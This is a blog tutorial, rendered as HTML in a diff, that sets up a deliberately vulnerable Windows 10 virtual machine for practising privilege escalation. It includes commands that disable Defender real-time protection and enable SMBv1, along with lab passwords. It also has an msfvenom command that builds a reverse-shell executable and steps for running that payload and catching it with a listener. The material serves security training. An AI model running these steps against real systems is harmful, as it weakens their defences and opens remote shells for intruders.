@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>Windows Privilege Escalation lab</title>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+
+<link rel="stylesheet" href="/application.56db8f450c98e200698def311092699a83c036dcc75dfef2c8f412f8f80c47af.css" integrity="sha256-VtuPRQyY4gBpje8xEJJpmoPANtzHXf7yyPQS&#43;PgMR68=" />
+
+
+
+
+
+<meta property="og:title" content="Windows Privilege Escalation lab" />
+<meta property="og:description" content="A Step-by-Step Guide When it comes to privilege escalation, the biggest obstacle learners face is where to practice. Most of the time, this is a step that comes after performing all other steps like reconnaissance, scanning, and gaining low privilege user access. When I was looking to better understand privilege escalation, I wanted a lab where I could practice this step alone, without having to go through different steps to gain low privilege user access." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/privilege-escalation/windows/setting-up-a-lab/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-02-16T13:41:42+03:00" />
+<meta property="article:modified_time" content="2023-02-16T13:41:42+03:00" />
+
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Windows Privilege Escalation lab"/>
+<meta name="twitter:description" content="A Step-by-Step Guide When it comes to privilege escalation, the biggest obstacle learners face is where to practice. Most of the time, this is a step that comes after performing all other steps like reconnaissance, scanning, and gaining low privilege user access. When I was looking to better understand privilege escalation, I wanted a lab where I could practice this step alone, without having to go through different steps to gain low privilege user access."/>
+
+    
+    
+<meta name="description" content="Windows Privilege Escalation lab" />
+
+
+    
+
+    
+        
+            
+            
+                
+                
+                
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1QLV0H8G51"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-1QLV0H8G51', { 'anonymize_ip': false });
+}
+</script>
+
+            
+
+            
+            
+
+            
+            
+
+            
+            
+
+            
+
+            
+        
+    
+
+
+
+
+<script>
+      theme = localStorage.getItem('darkmode:color-scheme') || 'system';
+      if (theme == 'system') {
+        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+          theme = 'dark';
+        } else {
+          theme = 'light';
+        }
+      }
+      document.documentElement.setAttribute('data-theme', theme);
+    </script>
+  </head>
+
+  <body class="type-posts kind-page" data-bs-spy="scroll" data-bs-target="#TableOfContents" data-bs-offset="80">
+    <div class="container-fluid bg-secondary wrapper">
+      
+      
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+
+
+
+  
+
+
+<nav class="navbar navbar-expand-xl top-navbar shadow " id="top-navbar">
+  <div class="container">
+    
+    <button class="navbar-toggler navbar-light" id="sidebar-toggler" type="button">
+      <i data-feather="sidebar"></i>
+    </button>
+    
+    <a class="navbar-brand" href="/">
+      narycyber</a>
+    <button
+      class="navbar-toggler navbar-light"
+      id="navbar-toggler"
+      type="button"
+      data-bs-toggle="collapse"
+      data-bs-target="#top-nav-items"
+      aria-label="menu"
+    >
+      <i data-feather="menu"></i>
+    </button>
+
+    <div class="collapse navbar-collapse dynamic-navbar" id="top-nav-items">
+      <ul class="nav navbar-nav ms-auto">
+        <li class="nav-item">
+          <a class="nav-link" href="/#home">Home</a>
+        </li>
+        
+          
+          
+            
+              
+              
+                <li class="nav-item">
+                  <a class="nav-link" href="/#about">About</a>
+                </li>
+              
+            
+            
+              
+              
+                <li class="nav-item">
+                  <a class="nav-link" href="/#skills">Skills</a>
+                </li>
+              
+            
+            
+              
+              
+                <li class="nav-item">
+                  <a class="nav-link" href="/#recent-posts">Recent Posts</a>
+                </li>
+              
+            
+            
+              
+              
+                <li class="nav-item">
+                  <a class="nav-link" href="/#experiences">Experiences</a>
+                </li>
+              
+            
+          
+        
+        
+          <div id="top-navbar-divider"></div>
+        
+        
+          <li class="nav-item">
+            <a class="nav-link" id="blog-link" href="/posts">Posts</a>
+          </li>
+        
+        
+        
+            
+        
+        
+        
+          <li class="nav-item dropdown">
+<a class="nav-link dropdown-toggle"  href="#" id="themeSelector" role="button"
+  data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+  <img id="navbar-theme-icon-svg" class="theme-icon" src="/icons/moon-svgrepo-com.svg" width=20 alt="Dark Theme">
+</a>
+<div id="themeMenu" class="dropdown-menu dropdown-menu-icons-only" aria-labelledby="themeSelector">
+  <a class="dropdown-item nav-link" href="#" data-scheme="light">
+    <img class="theme-icon" src="/icons/sun-svgrepo-com.svg" width=20 alt="Light Theme">
+  </a>
+  <a class="dropdown-item nav-link" href="#" data-scheme="dark">
+    <img class="theme-icon" src="/icons/moon-svgrepo-com.svg" width=20 alt="Dark Theme">
+  </a>
+  <a class="dropdown-item nav-link" href="#" data-scheme="system">
+    <img class="theme-icon" src="/icons/computer-svgrepo-com.svg" width=20 alt="System Theme">
+  </a>
+</div>
+</li>
+
+        
+      </ul>
+    </div>
+  </div>
+  
+  
+  
+</nav>
+
+
+
+      
+      
+  <section class="sidebar-section" id="sidebar-section">
+    <div class="sidebar-holder">
+      <div class="sidebar" id="sidebar">
+        <form class="mx-auto" method="get" action="/search">
+          <input type="text" name="keyword" value="" placeholder="Search" data-search="" id="search-box" />
+        </form>
+        <div class="sidebar-tree">
+          <ul class="tree" id="tree">
+            <li id="list-heading"><a href="/posts/" data-filter="all">Posts</a></li>
+            <div class="subtree">
+                
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/welcome/" title="Hey, Welcome">Hey, Welcome</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li>
+      <i data-feather="plus-circle"></i><a class=" list-link" href="/posts/api-penetration-testing/"> Api Penetration Testing</a>
+      
+      <ul class="">
+        
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/api-penetration-testing/owasp-api-top10-vapi-walkthrough/" title="OWASP API10 via VAPI">OWASP API10 via VAPI</a></li>
+  
+
+
+      </ul>
+    </li>
+  
+
+  
+  
+  
+  
+    
+    
+  
+  
+    
+    <li>
+      <i data-feather="minus-circle"></i><a class="active list-link" href="/posts/privilege-escalation/"> Privilege Escalation</a>
+      
+      <ul class="active">
+        
+  
+  
+  
+  
+  
+    
+    <li>
+      <i data-feather="plus-circle"></i><a class=" list-link" href="/posts/privilege-escalation/linux/"> Linux</a>
+      
+      <ul class="">
+        
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/privilege-escalation/linux/sudo-exploitation/" title="Sudo Exploitation">Sudo Exploitation</a></li>
+  
+
+
+      </ul>
+    </li>
+  
+
+  
+  
+  
+  
+    
+    
+  
+  
+    
+    <li>
+      <i data-feather="minus-circle"></i><a class="active list-link" href="/posts/privilege-escalation/windows/"> Windows</a>
+      
+      <ul class="active">
+        
+  
+  
+  
+  
+    
+    
+  
+  
+    
+    <li><a class="active list-link" href="/posts/privilege-escalation/windows/setting-up-a-lab/" title="Setting Up a lab">Setting Up a lab</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/privilege-escalation/windows/service-misconfigurations/" title="Service Misconfiguration">Service Misconfiguration</a></li>
+  
+
+
+      </ul>
+    </li>
+  
+
+
+      </ul>
+    </li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/vulnhub/" title="Vulnhub walkthrough">Vulnhub walkthrough</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li>
+      <i data-feather="plus-circle"></i><a class=" list-link" href="/posts/toolkit/"> Toolkit</a>
+      
+      <ul class="">
+        
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/toolkit/accesschk.exe/" title="Accesschk.exe">Accesschk.exe</a></li>
+  
+
+
+      </ul>
+    </li>
+  
+
+
+            </div>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+      
+      
+<section class="content-section" id="content-section">
+  <div class="content">
+    <div class="container p-0 read-area">
+      
+      <div class="hero-area col-sm-12" id="hero-area" style='background-image: url(/posts/privilege-escalation/windows/setting-up-a-lab/hero.jpg);'>
+      </div>
+
+      
+      <div class="page-content">
+        
+        <div class="author-profile ms-auto align-self-lg-center">
+          <img class="rounded-circle" src='/images/author/justus_hu21da735d27193e38d6c7d690c3134560_66867_120x120_fit_box_3.png' alt="Author Image">
+          <h5 class="author-name">Justus Juvenary</h5>
+          <p class="text-muted">Thursday, February 16, 2023</p>
+        </div>
+        
+        
+        <div class="title">
+          <h1>Windows Privilege Escalation lab</h1>
+        </div>
+
+        
+
+        
+        <div class="post-content" id="post-content">
+          <h2 id="a-step-by-step-guide">A Step-by-Step Guide</h2>
+<p>When it comes to privilege escalation, the biggest obstacle learners face is where to practice. Most of the time, this is a step that comes after performing all other steps like reconnaissance, scanning, and gaining low privilege user access. When I was looking to better understand privilege escalation, I wanted a lab where I could practice this step alone, without having to go through different steps to gain low privilege user access. This blog post will help you with that. We will learn how to set up a lab where we can practice our craft</p>
+<p>To create a lab for testing and learning Windows privilege escalation, the following steps will help achieve that. As this is a post-exploitation process, this write-up assumes that the reader understands how to set up a hacking lab using virtual machine software and how to use Linux.</p>
+<p>The following are the steps to set up a lab for practising Windows privilege escalation:</p>
+<h4 id="step-1">Step 1:</h4>
+<p>Ensure that you have a virtual machine software with Linux installed. This is because we will be installing the Windows 10 that we will be attacking into the same virtual machine sotware.</p>
+<h4 id="step-2">Step 2:</h4>
+<p>Download the <a href="https://www.microsoft.com/en-us/software-download/windows10ISO" target="_blank" rel="noopener">Windows 10 ISO</a> from the Microsoft website and download the following tools to your Linux directory: <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener">PowerUp.ps1</a>, <a href="https://github.com/carlospolop/PEASS-ng/releases/download/20230212/winPEASany.exe" target="_blank" rel="noopener">winPEASany.exe</a>, <a href="https://raw.githubusercontent.com/Tib3rius/Windows-PrivEsc-Setup/master/setup.bat" target="_blank" rel="noopener">setup script</a>, and so on. You can download all the tools you want to use for Windows privilege escalation.</p>
+<h4 id="step-3">Step 3:</h4>
+<p>Install Windows 10 into a virtual machine. Again, as this is a post-exploitation step, it as sumes that you have a basic knowledge of setting up a hacking lab.</p>
+<h4 id="step-4">Step 4:</h4>
+<p>Log in to the Windows 10 machine and perform the following:</p>
+<ul>
+<li>Enable SMB version 1 for easier file transfer. To do this, open PowerShell as an administrator and run:</li>
+</ul>
+<p><code>Enable-WindowsOptionalFeature -Online -FeatureName &quot;SMB1Protocol-Client&quot; -All</code></p>
+<ul>
+<li>Disable real-time protection on Windows. Open PowerShell as an administrator and run:</li>
+</ul>
+<p><code>Set-MpPreference -DisableRealtimeMonitoring $true</code></p>
+<h4 id="step-5">Step 5:</h4>
+<ul>
+<li>If you downloaded the tools into the Windows 10 that we installed, then continue with step 7.</li>
+<li>If you used a Linux machine to download the tools and script above, change the directory to the one with the tools and set up an SMB server in a directory where the tools are with the following command (my directory&rsquo;s name is  tools, change the directory name in the command to that of yours):</li>
+</ul>
+<p><code>python /usr/share/doc/python3-impacket/examples/smbserver.py tools .</code></p>
+<p><img src="narycyber.github.io/content/posts/Privilege%20Escalation/Windows/setting%20up%20a%20lab/Screenshotfrom2023-02-1415-07-20.png" alt="screenshot_for_tools">
+<em>The above screenshot shows tools in my kali machine.</em></p>
+<p> </p>
+<p><img src="narycyber.github.io/content/posts/Privilege%20Escalation/Windows/setting%20up%20a%20lab/Screenshotfrom2023-02-1415-07-59.png" alt="python_command">
+The above screenshot shows the python command to setup smb server.</p>
+<p> </p>
+<h4 id="step-6">Step 6:</h4>
+<p>In our Windows 10, since we already enabled SMB protocol, open the Command Prompt (CMD) as an administrator and copy the setup.bat file from the Kali Linux machine where we set up the SMB server to our Windows machine using the following command:</p>
+<pre tabindex="0"><code>copy \\{put IP address of the Linux machine}\{folder where you set up an SMB server}\setup.bat .
+
+e.g. copy \\192.168.1.123\tools .
+</code></pre><h4 id="step-7">Step 7.</h4>
+<ul>
+<li>Run the setup script. On your cmd as administrator, change folder to where you saved the script and run the following command.</li>
+</ul>
+<p><code>.\setup.bat</code></p>
+<ul>
+<li>When the script finishes, restart Windows.</li>
+</ul>
+<h4 id="step-8">Step 8.</h4>
+<ul>
+<li>The VM (Windows machine) should auto-login as an admin user. We have to sign out and login as a user in order to continue with Windows privilege escalation practices.</li>
+</ul>
+<p>Credentials for logging in after running a setup script</p>
+<pre tabindex="0"><code>User: User, password: password321  
+User: Admin, password: password123
+</code></pre><ul>
+<li>Sometimes after you log in as a user, you will get a command prompt asking you for an Admin password. Provide the above password to continue.</li>
+</ul>
+<h4 id="step-9">Step 9.</h4>
+<ul>
+<li>Create a snapshot of your VM if the VM software you are using supports it. This will let you reset the VM to this exact point if you want to start again with a fresh setup.</li>
+<li>A writable directory exists in the C drive called PrivEsc. You can use this directory to save files.</li>
+</ul>
+<h4 id="step-10">Step 10.</h4>
+<p>In your Linux machine, create a reverse shell payload that will be used in a Windows machine when we have any admin privilege to execute commands. Run the following msfvenom command on Linux terminal</p>
+<p><code># msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.127 LPORT=53 -f exe -o reverse.exe</code></p>
+<p>Please change the <code>LHOST</code> to your <code>Linux IP address</code>, and <code>LPORT</code> to the <code>port you want to listen to.</code> This reverse shell can be caught using netcat or Metasploit’s own multi/handler.</p>
+<ul>
+<li>Copy this payload into windows PrivEsc folder.
+<code>e.g. copy\\192.168.1.123\tools\reverse.exe . </code></li>
+<li>Then create a listener using netcat or metasploit&rsquo;s multi/handler.</li>
+<li>Run the reverse shell payload (<code>.\reverse.exe</code>) to continue with the practise using linux machine instead on windows machine
+<img src="reverse_and_listner.png" alt="reverse_listener"></li>
+</ul>
+<p> </p>
+<h3 id="conclusion">Conclusion</h3>
+<p>The aforementioned steps demonstrate how to establish a lab for practising Windows privilege escalation. By following these instructions, you can create a completely functional lab environment to enhance your skills in Windows privilege escalation. Through this lab, you can gain valuable insights into identifying and exploiting vulnerabilities, comprehending the intricacies of escalating privileges, and improving your ability to secure Windows systems.</p>
+
+        </div>
+
+        
+        <div class="row ps-3 pe-3">
+        
+          <div class="col-md-6 share-buttons">
+          
+          </div>
+
+        
+        
+          
+            
+          
+          <div class="col-md-6 btn-improve-page">
+             
+               <a href="https://github.com/hugo-toha/hugo-toha.github.io/edit/main/content/posts/Privilege%20Escalation/Windows/setting%20up%20a%20lab/index.md" title="Improve this page" target="_blank" rel="noopener">
+            
+                <i class="fas fa-code-branch"></i>
+                Improve this page
+              </a>
+          </div>
+        
+        </div>
+
+
+
+      
+      <hr />
+        
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+    
+    
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+
+<div class="row next-prev-navigator">
+  
+    <div class="col-md-6 previous-article">
+      <a href="/posts/privilege-escalation/linux/sudo-exploitation/" title="Escalating Privileges with Sudo" class="btn filled-button">
+        <div><i class="fas fa-chevron-circle-left"></i> Prev</div>
+        <div class="next-prev-text">Escalating Privileges with Sudo</div>
+      </a>
+    </div>
+  
+  
+      
+      
+        
+      
+      <div class="col-md-6 next-article">
+        <a href="/posts/privilege-escalation/windows/service-misconfigurations/" title="Service Misconfiguration" class="btn filled-button">
+          <div>Next <i class="fas fa-chevron-circle-right"></i></div>
+          <div class="next-prev-text">Service Misconfiguration</div>
+        </a>
+      </div>
+    
+</div>
+
+      <hr />
+
+      
+      
+
+      
+      
+
+      </div>
+    </div>
+  </div>
+  
+  <a id="scroll-to-top" class="btn" type="button" data-bs-toggle="tooltip" data-bs-placement="left" title="Scroll to top">
+    <i class="fas fa-chevron-circle-up"></i>
+  </a>
+</section>
+
+
+      
+      
+  <section class="toc-section" id="toc-section">
+    
+    <div class="toc-holder">
+      <h5 class="text-center ps-3">Table of Contents</h5>
+      <hr>
+      <div class="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#a-step-by-step-guide">A Step-by-Step Guide</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#step-1">Step 1:</a></li>
+            <li><a href="#step-2">Step 2:</a></li>
+            <li><a href="#step-3">Step 3:</a></li>
+            <li><a href="#step-4">Step 4:</a></li>
+            <li><a href="#step-5">Step 5:</a></li>
+            <li><a href="#step-6">Step 6:</a></li>
+            <li><a href="#step-7">Step 7.</a></li>
+            <li><a href="#step-8">Step 8.</a></li>
+            <li><a href="#step-9">Step 9.</a></li>
+            <li><a href="#step-10">Step 10.</a></li>
+          </ul>
+        </li>
+        <li><a href="#conclusion">Conclusion</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      </div>
+    </div>
+    
+  </section>
+
+    </div>
+
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  
+  
+    
+  
+
+  
+  
+    
+  
+
+  
+  
+    
+    
+      
+    
+  
+
+
+  
+  
+  
+    
+  
+
+  
+  
+  
+
+  
+  
+  
+    
+  
+  
+
+  
+  
+  
+
+  <footer id="footer" class="container-fluid text-center align-content-center footer pb-2">
+    <div class="container pt-5">
+      <div class="row text-start">
+        
+        <div class="col-md-4 col-sm-12">
+          <h5>Navigation</h5>
+          
+          <ul>
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="http://localhost:1313/#about">About</a>
+                </li>
+              
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="http://localhost:1313/#skills">Skills</a>
+                </li>
+              
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="http://localhost:1313/#recent-posts">Recent Posts</a>
+                </li>
+              
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="http://localhost:1313/#experiences">Experiences</a>
+                </li>
+              
+            
+              
+                
+              
+            
+          </ul>
+          
+        </div>
+        
+        
+        <div class="col-md-4 col-sm-12">
+          <h5>Contact me:</h5>
+          <ul>
+            
+              
+                <li><a href=mailto:jusnary1@gmail.com target="_blank" rel="noopener">
+                  <span><i class="fas fa-envelope"></i></span> <span>jusnary1@gmail.com</span>
+                </a></li>
+              
+            
+              
+                <li>
+                  
+                  <a href=https://www.linkedin.com/in/justus-juvenary target="_blank" rel="noopener">
+                    <span><i class=fab&#32;fa-linkedin></i></span> <span>Justus Juvenary</span>
+                  </a>
+                  
+                </li>
+              
+            
+          </ul>
+        </div>
+        
+        
+        
+      </div>
+    </div>
+    
+    
+    <hr />
+    <div class="container">
+      <div class="row text-start">
+        <div class="col-md-4">
+          <a id="theme" href="https://www.linkedin.com/in/justus-juvenary/" target="_blank" rel="noopener">
+            Justus Juvenary
+          </a>
+        </div>
+        <div class="col-md-4 text-center">© 2024 Copyright.</div>
+        <div class="col-md-4 text-end">
+          <a id="hugo" href="https://www.narycyber.com/" target="_blank" rel="noopener">
+            NaryCyber
+          </a>
+        </div>
+      </div>
+    </div>
+    
+  </footer>
+
+
+    <script src="/application.b91ad4f8dcfc23b15c9ba98e2b039a62fd05938843f9092a89760a31bc5b2cd4.js" integrity="sha256-uRrU&#43;Nz8I7Fcm6mOKwOaYv0Fk4hD&#43;QkqiXYKMbxbLNQ=" defer></script>
+
+
+    
+     
+
+    
+</body>
+</html>
